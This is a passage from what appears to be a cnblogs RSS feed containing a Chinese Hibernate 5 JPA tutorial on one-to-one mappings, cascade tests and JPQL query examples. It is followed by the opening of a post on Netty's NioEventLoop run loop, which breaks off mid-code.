        public void setStuId(Long stuId) {
                this.stuId = stuId;
        }

        public String getStuName() {
                return stuName;
        }

        public void setStuName(String stuName) {
                this.stuName = stuName;
        }

        public String getStuSex() {
                return stuSex;
        }

        public void setStuSex(String stuSex) {
                this.stuSex = stuSex;
        }

        @Override
        public String toString() {
                return &quot;StuBaseInfo [stuId=&quot; + stuId + &quot;, stuName=&quot; + stuName + &quot;, stuSex=&quot; + stuSex + &quot;]&quot;;
        }

        /**
         * 一对一：另一方的对象
         * @OneToOne    ：映射一对一
         *      * fetch         ：抓取策略
         *              FetchType.LAZY          ：延迟加载（默认）
         *              FetchType.EAGER         ：迫切查询（多表连接查询）
         *      * cascade       ：级联操作
         *              CascadeType.PERSIST     ：级联保存
         *              CascadeType.MERGE       ：级联更新
         *              CascadeType.REMOVE      ：级联删除
         *              CascadeType.ALL         ：全部支持
         *  * mappedBy  ：放弃外键维护
         */
        @OneToOne(fetch = FetchType.EAGER, cascade = CascadeType.ALL, mappedBy = &quot;stuBaseInfo&quot;)
        private StuOtherInfo stuOtherInfo;

        public StuOtherInfo getStuOtherInfo() {
                return stuOtherInfo;
        }

        public void setStuOtherInfo(StuOtherInfo stuOtherInfo) {
                this.stuOtherInfo = stuOtherInfo;
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;StuOtherInfo.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/StuOtherInfo.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import javax.persistence.CascadeType;
import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.FetchType;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.JoinColumn;
import javax.persistence.OneToOne;
import javax.persistence.Table;

@Entity
@Table(name = &quot;student_other_info&quot;)
public class StuOtherInfo {

        @Id
        @GeneratedValue(strategy = GenerationType.IDENTITY)
        @Column(name = &quot;stu_id&quot;)
        private Long stuId;

        @Column(name = &quot;stu_img&quot;)
        private String stuImg;

        @Column(name = &quot;stu_address&quot;)
        private String stuAddress;

        public Long getStuId() {
                return stuId;
        }

        public void setStuId(Long stuId) {
                this.stuId = stuId;
        }

        public String getStuImg() {
                return stuImg;
        }

        public void setStuImg(String stuImg) {
                this.stuImg = stuImg;
        }

        public String getStuAddress() {
                return stuAddress;
        }

        public void setStuAddress(String stuAddress) {
                this.stuAddress = stuAddress;
        }

        @Override
        public String toString() {
                return &quot;StuOtherInfo [stuId=&quot; + stuId + &quot;, stuImg=&quot; + stuImg + &quot;, stuAddress=&quot; + stuAddress + &quot;]&quot;;
        }

        /**
         * 一对一：另一方的对象
         * @OneToOne    ：映射一对一
         *      * fetch         ：抓取策略
         *              FetchType.LAZY          ：延迟加载（默认）
         *              FetchType.EAGER         ：迫切查询（多表连接查询）
         *      * cascade       ：级联操作
         *              CascadeType.PERSIST     ：级联保存
         *              CascadeType.MERGE       ：级联更新
         *              CascadeType.REMOVE      ：级联删除
         *              CascadeType.ALL         ：全部支持
         * @JoinColumn  ：设置两张表之间外键列
         *              name                            ；外键的名称
         */
        @OneToOne(fetch = FetchType.EAGER, cascade = CascadeType.ALL)
        @JoinColumn(name = &quot;stu_id&quot;)
        private StuBaseInfo stuBaseInfo ;

        public StuBaseInfo getStuBaseInfo() {
                return stuBaseInfo;
        }

        public void setStuBaseInfo(StuBaseInfo stuBaseInfo) {
                this.stuBaseInfo = stuBaseInfo;
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;332、测试代码&quot;&gt;3.3.2、测试代码&lt;/h4&gt;
&lt;p&gt;OneToOneTest.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/OneToOneTest.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import javax.persistence.EntityManager;
import javax.persistence.EntityTransaction;

import org.junit.Test;

public class OneToOneTest {

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=create
         * 保存学生基本信息级联保存学生拓展信息
         */
        @Test
        public void test1() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                // 创建两个学生基本信息
                StuBaseInfo stuBaseInfo1 = new StuBaseInfo();
                stuBaseInfo1.setStuName(&quot;张三&quot;);
                StuBaseInfo stuBaseInfo2 = new StuBaseInfo();
                stuBaseInfo2.setStuName(&quot;李四&quot;);

                // 创建两个学生拓展信息
                StuOtherInfo stuOtherInfo1 = new StuOtherInfo();
                stuOtherInfo1.setStuImg(&quot;http:img.caochenlei.com/001.png&quot;);
                StuOtherInfo stuOtherInfo2 = new StuOtherInfo();
                stuOtherInfo2.setStuImg(&quot;http:img.caochenlei.com/002.png&quot;);

                stuBaseInfo1.setStuOtherInfo(stuOtherInfo1);
                stuBaseInfo2.setStuOtherInfo(stuOtherInfo2);
                stuOtherInfo1.setStuBaseInfo(stuBaseInfo1);
                stuOtherInfo2.setStuBaseInfo(stuBaseInfo2);

                entityManager.persist(stuBaseInfo1);
                entityManager.persist(stuBaseInfo2);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=create
         * 保存学生拓展信息级联保存学生基本信息
         */
        @Test
        public void test2() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                // 创建两个学生基本信息
                StuBaseInfo stuBaseInfo1 = new StuBaseInfo();
                stuBaseInfo1.setStuName(&quot;张三&quot;);
                StuBaseInfo stuBaseInfo2 = new StuBaseInfo();
                stuBaseInfo2.setStuName(&quot;李四&quot;);

                // 创建两个学生拓展信息
                StuOtherInfo stuOtherInfo1 = new StuOtherInfo();
                stuOtherInfo1.setStuImg(&quot;http:img.caochenlei.com/001.png&quot;);
                StuOtherInfo stuOtherInfo2 = new StuOtherInfo();
                stuOtherInfo2.setStuImg(&quot;http:img.caochenlei.com/002.png&quot;);

                stuBaseInfo1.setStuOtherInfo(stuOtherInfo1);
                stuBaseInfo2.setStuOtherInfo(stuOtherInfo2);
                stuOtherInfo1.setStuBaseInfo(stuBaseInfo1);
                stuOtherInfo2.setStuBaseInfo(stuBaseInfo2);

                entityManager.persist(stuOtherInfo1);
                entityManager.persist(stuOtherInfo2);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 查询学生基本信息级联查询学生拓展信息
         */
        @Test
        public void test3() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                StuBaseInfo stuBaseInfo = entityManager.find(StuBaseInfo.class, 1L);
                System.out.println(stuBaseInfo);
                StuOtherInfo stuOtherInfo = stuBaseInfo.getStuOtherInfo();
                System.out.println(stuOtherInfo);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 查询学生拓展信息级联查询学生基本信息
         */
        @Test
        public void test4() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                StuOtherInfo stuOtherInfo = entityManager.find(StuOtherInfo.class, 1L);
                System.out.println(stuOtherInfo);
                StuBaseInfo stuBaseInfo = stuOtherInfo.getStuBaseInfo();
                System.out.println(stuBaseInfo);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 更新学生基本信息级联更新学生拓展信息
         */
        @Test
        public void test5() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                StuBaseInfo stuBaseInfo = entityManager.find(StuBaseInfo.class, 1L);
                stuBaseInfo.setStuSex(&quot;男&quot;);
                StuOtherInfo stuOtherInfo = stuBaseInfo.getStuOtherInfo();
                stuOtherInfo.setStuAddress(&quot;河北省&quot;);
                entityManager.merge(stuBaseInfo);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 更新学生拓展信息级联更新学生基本信息
         */
        @Test
        public void test6() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                StuOtherInfo stuOtherInfo = entityManager.find(StuOtherInfo.class, 2L);
                stuOtherInfo.setStuAddress(&quot;河南省&quot;);
                StuBaseInfo stuBaseInfo = stuOtherInfo.getStuBaseInfo();
                stuBaseInfo.setStuSex(&quot;女&quot;);
                entityManager.merge(stuOtherInfo);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 删除学生基本信息级联删除学生拓展信息
         */
        @Test
        public void test7() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                StuBaseInfo stuBaseInfo = entityManager.find(StuBaseInfo.class, 1L);
                entityManager.remove(stuBaseInfo);

                transaction.commit();
                entityManager.close();
        }

        /**
         * 运行之前，修改hibernate.hbm2ddl.auto=update
         * 删除学生拓展信息级联删除学生基本信息
         */
        @Test
        public void test8() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                StuOtherInfo stuOtherInfo = entityManager.find(StuOtherInfo.class, 2L);
                entityManager.remove(stuOtherInfo);

                transaction.commit();
                entityManager.close();
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;第四章-hibernate5-jpa的jpql查询&quot;&gt;第四章 Hibernate5 JPA的JPQL查询&lt;/h2&gt;
&lt;p&gt;初始化数据，运行init方法：&lt;/p&gt;
&lt;p&gt;InitQueryData.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/InitQueryData.java）&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;package com.caochenlei.hibernate.jpa;

import javax.persistence.EntityManager;
import javax.persistence.EntityTransaction;

import org.junit.Test;

public class InitQueryData {

        /**
         * 执行前：修改hibernate.hbm2ddl.auto=create
         * 执行此方法
         * 执行后：修改hibernate.hbm2ddl.auto=update
         */
        @Test
        public void init() {
                EntityManager entityManager = JPAUtil.getEntityManager();
                EntityTransaction transaction = entityManager.getTransaction();
                transaction.begin();

                // 创建一个客户
                Customer customer1 = new Customer();
                customer1.setCustName(&quot;张三&quot;);
                customer1.setCustSource(&quot;电视广告&quot;);
                // 创建十个联系人
                for (int i = 1; i &amp;lt;= 10; i++) {
                        LinkMan linkMan = new LinkMan();
                        linkMan.setLkmName(&quot;张三的联系人&quot; + i);
                        linkMan.setCustomer(customer1);
                        customer1.getLinkMans().add(linkMan);
                        entityManager.persist(linkMan);
                }
                entityManager.persist(customer1);

                // 创建一个客户
                Customer customer2 = new Customer();
                customer2.setCustName(&quot;李四&quot;);
                customer2.setCustSource(&quot;网络论坛&quot;);
                // 创建十个联系人
                for (int i = 1; i &amp;lt;= 10; i++) {
                        LinkMan linkMan = new LinkMan();
                        linkMan.setLkmName(&quot;李四的联系人&quot; + i);
                        linkMan.setCustomer(customer2);
                        customer2.getLinkMans().add(linkMan);
                        entityManager.persist(linkMan);
                }
                entityManager.persist(customer2);

                // 创建一个客户
                Customer customer3 = new Customer();
                customer3.setCustName(&quot;王五&quot;);
                customer3.setCustSource(&quot;街边告示&quot;);
                // 创建十个联系人
                for (int i = 1; i &amp;lt;= 10; i++) {
                        LinkMan linkMan = new LinkMan();
                        linkMan.setLkmName(&quot;王五的联系人&quot; + i);
                        linkMan.setCustomer(customer3);
                        customer3.getLinkMans().add(linkMan);
                        entityManager.persist(linkMan);
                }
                entityManager.persist(customer3);

                // 创建一个客户
                Customer customer4 = new Customer();
                customer4.setCustName(&quot;王五&quot;);
                customer4.setCustSource(&quot;电视广告&quot;);
                entityManager.persist(customer4);

                transaction.commit();
                entityManager.close();
        }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;以下的方法，均在下边文件进行测试：&lt;/p&gt;
&lt;p&gt;JPQLTest.java（全路径：/hibernate_jpa/src/com/caochenlei/hibernate/jpa/JPQLTest.java）&lt;/p&gt;
&lt;h3 id=&quot;41、简单查询&quot;&gt;4.1、简单查询&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void test1() {
        EntityManager entityManager = JPAUtil.getEntityManager();
        EntityTransaction transaction = entityManager.getTransaction();
        transaction.begin();

        // 查询所有客户
        Query query = entityManager.createQuery(&quot;from Customer&quot;);
        List&amp;lt;Customer&amp;gt; list = query.getResultList();
        for (Customer customer : list) {
                System.out.println(customer);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        transaction.commit();
        entityManager.close();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;42、别名查询&quot;&gt;4.2、别名查询&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void test2() {
        EntityManager entityManager = JPAUtil.getEntityManager();
        EntityTransaction transaction = entityManager.getTransaction();
        transaction.begin();

        // 查询所有客户
        Query query1 = entityManager.createQuery(&quot;from Customer c&quot;);
        List&amp;lt;Customer&amp;gt; list1 = query1.getResultList();
        for (Customer customer : list1) {
                System.out.println(customer);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        // 查询所有客户
        Query query2 = entityManager.createQuery(&quot;select c from Customer c&quot;);
        List&amp;lt;Customer&amp;gt; list2 = query2.getResultList();
        for (Customer customer : list2) {
                System.out.println(customer);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        transaction.commit();
        entityManager.close();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;43、排序查询&quot;&gt;4.3、排序查询&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void test3() {
        EntityManager entityManager = JPAUtil.getEntityManager();
        EntityTransaction transaction = entityManager.getTransaction();
        transaction.begin();

        // 采用链式调用，默认情况（升序）
        List&amp;lt;Customer&amp;gt; list1 = entityManager.createQuery(&quot;from Customer order by cust_id&quot;).getResultList();
        for (Customer customer : list1) {
                System.out.println(customer);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        // 采用链式调用，升序情况
        List&amp;lt;Customer&amp;gt; list2 = entityManager.createQuery(&quot;from Customer order by cust_id asc&quot;).getResultList();
        for (Customer customer : list2) {
                System.out.println(customer);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        // 采用链式调用，降序情况
        List&amp;lt;Customer&amp;gt; list3 = entityManager.createQuery(&quot;from Customer order by cust_id desc&quot;).getResultList();
        for (Customer customer : list3) {
                System.out.println(customer);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        transaction.commit();
        entityManager.close();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;44、条件查询&quot;&gt;4.4、条件查询&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void test4() {
        EntityManager entityManager = JPAUtil.getEntityManager();
        EntityTransaction transaction = entityManager.getTransaction();
        transaction.begin();

        // 条件查询：按参数位置绑定
        Query query1 = entityManager.createQuery(&quot;from Customer where cust_source = ? and cust_name like ?&quot;);
        query1.setParameter(1, &quot;电视广告&quot;);
        query1.setParameter(2, &quot;王%&quot;);
        List&amp;lt;Customer&amp;gt; list1 = query1.getResultList();
        for (Customer customer : list1) {
                System.out.println(customer);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        // 条件查询：按参数名称绑定
        Query query2 = entityManager.createQuery(&quot;from Customer where cust_source = :aaa and cust_name like :bbb&quot;);
        query2.setParameter(&quot;aaa&quot;, &quot;电视广告&quot;);
        query2.setParameter(&quot;bbb&quot;, &quot;王%&quot;);
        List&amp;lt;Customer&amp;gt; list2 = query2.getResultList();
        for (Customer customer : list2) {
                System.out.println(customer);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        transaction.commit();
        entityManager.close();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;45、投影查询&quot;&gt;4.5、投影查询&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void test5() {
        EntityManager entityManager = JPAUtil.getEntityManager();
        EntityTransaction transaction = entityManager.getTransaction();
        transaction.begin();

        // 查询所有客户名称：单个字段查询
        Query query1 = entityManager.createQuery(&quot;select c.custName from Customer c&quot;);
        List&amp;lt;Object&amp;gt; list1 = query1.getResultList();
        for (Object cust_name : list1) {
                System.out.println(cust_name);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        // 查询所有客户名称、客户来源：多个字段查询，封装到数组中
        Query query2 = entityManager.createQuery(&quot;select c.custName,c.custSource from Customer c&quot;);
        List&amp;lt;Object[]&amp;gt; list2 = query2.getResultList();
        for (Object[] objects : list2) {
                System.out.println(Arrays.toString(objects));
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        // 查询所有客户名称、客户来源：多个字段查询，封装到对象中
        // 请在Customer.java添加以下两个构造方法，否则会执行失败
        // public Customer()
        // public Customer(String custName, String custSource)
        Query query3 = entityManager.createQuery(&quot;select new Customer(c.custName,c.custSource) from Customer c&quot;);
        List&amp;lt;Customer&amp;gt; list3 = query3.getResultList();
        for (Customer customer : list3) {
                System.out.println(customer);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        transaction.commit();
        entityManager.close();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;46、分页查询&quot;&gt;4.6、分页查询&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void test6() {
        EntityManager entityManager = JPAUtil.getEntityManager();
        EntityTransaction transaction = entityManager.getTransaction();
        transaction.begin();

        // 分页查询
        Query query = entityManager.createQuery(&quot;from LinkMan&quot;);
        query.setFirstResult(0);
        query.setMaxResults(10);
        List&amp;lt;LinkMan&amp;gt; list = query.getResultList();
        for (LinkMan linkMan : list) {
                System.out.println(linkMan);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        transaction.commit();
        entityManager.close();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;47、分组查询&quot;&gt;4.7、分组查询&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void test7() {
        EntityManager entityManager = JPAUtil.getEntityManager();
        EntityTransaction transaction = entityManager.getTransaction();
        transaction.begin();

        // 聚合函数：count(),max(),min(),avg(),sum()
        Object object = entityManager.createQuery(&quot;select count(*) from Customer&quot;).getSingleResult();
        System.out.println(object);
        System.err.println(&quot;--------------------------------------------------&quot;);

        // 分组统计：
        List&amp;lt;Object[]&amp;gt; list = entityManager.createQuery(&quot;select custSource,count(*) from Customer group by cust_source&quot;).getResultList();
        for (Object[] objects : list) {
                System.out.println(Arrays.toString(objects));
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        transaction.commit();
        entityManager.close();
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;48、多表查询&quot;&gt;4.8、多表查询&lt;/h3&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Test
public void test8() {
        EntityManager entityManager = JPAUtil.getEntityManager();
        EntityTransaction transaction = entityManager.getTransaction();
        transaction.begin();

        // 内连接
        List&amp;lt;Object[]&amp;gt; list1 = entityManager.createQuery(&quot;from Customer c inner join c.linkMans&quot;).getResultList();
        for (Object[] objects : list1) {
                System.out.println(Arrays.toString(objects));
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        // 迫切内连接（hibernate独有，将另一个对象的数据封装到该对象中）
        List&amp;lt;Customer&amp;gt; list2 = entityManager.createQuery(&quot;select distinct c from Customer c inner join fetch c.linkMans&quot;).getResultList();
        for (Customer customer : list2) {
                System.out.println(customer);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        // 左外连接
        List&amp;lt;Object[]&amp;gt; list3 = entityManager.createQuery(&quot;from Customer c left outer join c.linkMans&quot;).getResultList();
        for (Object[] objects : list3) {
                System.out.println(Arrays.toString(objects));
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        // 迫切左外连接（hibernate独有，将另一个对象的数据封装到该对象中）
        List&amp;lt;Customer&amp;gt; list4 = entityManager.createQuery(&quot;select distinct c from Customer c left outer join fetch c.linkMans&quot;).getResultList();
        for (Customer customer : list4) {
                System.out.println(customer);
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        // 右外连接
        List&amp;lt;Object[]&amp;gt; list5 = entityManager.createQuery(&quot;from Customer c right outer join c.linkMans&quot;).getResultList();
        for (Object[] objects : list5) {
                System.out.println(Arrays.toString(objects));
        }
        System.err.println(&quot;--------------------------------------------------&quot;);

        transaction.commit();
        entityManager.close();
}
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Sat, 08 Aug 2020 13:18:00 +0000</pubDate>
<dc:creator>轻松的小希</dc:creator>
<og:description>配套资料，免费下载 链接：https://pan.baidu.com/s/158JkczSacADez-fEMDXSYQ 提取码：2ce1 复制这段内容后打开百度网盘手机App，操作更方便哦 第一章</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/caochenlei/p/13460373.html</dc:identifier>
</item>
<item>
<title>Netty(二)：如何处理io请求？ - 等你归去来</title>
<link>http://www.cnblogs.com/yougewe/p/13418559.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/yougewe/p/13418559.html</guid>
<description>&lt;p&gt;　　文接上一篇。上篇讲到netty暴露一个端口出来，acceptor, handler, pipeline, eventloop 都已准备好。但是并没体现其如何处理接入新的网络请求，今天我们就一起来看看吧。&lt;/p&gt;

&lt;h3&gt;1. eventloop主循环&lt;/h3&gt;
&lt;p&gt;　　上篇讲到，netty启动起来之后，就会有很多个eventloop线程会一直在循环工作（server通用特性），比如进行select或者执行task. 我们再来回顾 NioEventLoop 的实现方式吧！&lt;/p&gt;
&lt;p&gt;　　我们先看看下 NioEventLoop 的类图吧：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/830731/202008/830731-20200802132435561-1105105060.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 　　看起来非常复杂，不管它。它核心方法自然是 run();&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;66&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; io.netty.channel.nio.NioEventLoop#run&lt;/span&gt;
&lt;span&gt;    @Override
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; run() {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 一个死循环检测任务, 这就 eventloop 的大杀器哦&lt;/span&gt;
        &lt;span&gt;for&lt;/span&gt;&lt;span&gt; (;;) {
            &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                &lt;/span&gt;&lt;span&gt;switch&lt;/span&gt;&lt;span&gt; (selectStrategy.calculateStrategy(selectNowSupplier, hasTasks())) {
                    &lt;/span&gt;&lt;span&gt;case&lt;/span&gt;&lt;span&gt; SelectStrategy.CONTINUE:
                        &lt;/span&gt;&lt;span&gt;continue&lt;/span&gt;&lt;span&gt;;
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 有任务时执行任务, 否则阻塞等待网络事件, 或被唤醒&lt;/span&gt;
                    &lt;span&gt;case&lt;/span&gt;&lt;span&gt; SelectStrategy.SELECT:
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; select.select(), 带超时限制&lt;/span&gt;
                        select(wakenUp.getAndSet(&lt;span&gt;false&lt;/span&gt;&lt;span&gt;));

                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 'wakenUp.compareAndSet(false, true)' is always evaluated
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; before calling 'selector.wakeup()' to reduce the wake-up
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; overhead. (Selector.wakeup() is an expensive operation.)
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
                        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; However, there is a race condition in this approach.
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; The race condition is triggered when 'wakenUp' is set to
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; true too early.
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
                        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; 'wakenUp' is set to true too early if:
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 1) Selector is waken up between 'wakenUp.set(false)' and
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;    'selector.select(...)'. (BAD)
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 2) Selector is waken up between 'selector.select(...)' and
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;    'if (wakenUp.get()) { ... }'. (OK)
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
                        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; In the first case, 'wakenUp' is set to true and the
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; following 'selector.select(...)' will wake up immediately.
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Until 'wakenUp' is set to false again in the next round,
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 'wakenUp.compareAndSet(false, true)' will fail, and therefore
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; any attempt to wake up the Selector will fail, too, causing
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; the following 'selector.select(...)' call to block
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; unnecessarily.
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;
                        &lt;span&gt;//&lt;/span&gt;&lt;span&gt; To fix this problem, we wake up the selector again if wakenUp
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; is true immediately after selector.select(...).
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; It is inefficient in that it wakes up the selector for both
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; the first case (BAD - wake-up required) and the second case
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; (OK - no wake-up required).&lt;/span&gt;

                        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (wakenUp.get()) {
                            selector.wakeup();
                        }
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; fall through&lt;/span&gt;
                    &lt;span&gt;default&lt;/span&gt;&lt;span&gt;:
                }

                cancelledKeys &lt;/span&gt;= 0&lt;span&gt;;
                needsToSelectAgain &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
                &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ioRatio 为io操作的占比, 和运行任务相比, 默认为 50:50&lt;/span&gt;
                &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; ioRatio = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.ioRatio;
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (ioRatio == 100&lt;span&gt;) {
                    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; step1. 运行io操作&lt;/span&gt;
&lt;span&gt;                        processSelectedKeys();
                    } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Ensure we always run tasks.
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; step2. 运行task任务&lt;/span&gt;
&lt;span&gt;                        runAllTasks();
                    }
                } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
                    &lt;/span&gt;&lt;span&gt;final&lt;/span&gt; &lt;span&gt;long&lt;/span&gt; ioStartTime =&lt;span&gt; System.nanoTime();
                    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
                        processSelectedKeys();
                    } &lt;/span&gt;&lt;span&gt;finally&lt;/span&gt;&lt;span&gt; {
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Ensure we always run tasks.&lt;/span&gt;
                        &lt;span&gt;final&lt;/span&gt; &lt;span&gt;long&lt;/span&gt; ioTime = System.nanoTime() -&lt;span&gt; ioStartTime;
                        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 运行任务的最长时间&lt;/span&gt;
                        runAllTasks(ioTime * (100 - ioRatio) /&lt;span&gt; ioRatio);
                    }
                }
            } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Throwable t) {
                handleLoopException(t);
            }
            &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; Always handle shutdown even if the loop processing threw an exception.&lt;/span&gt;
            &lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
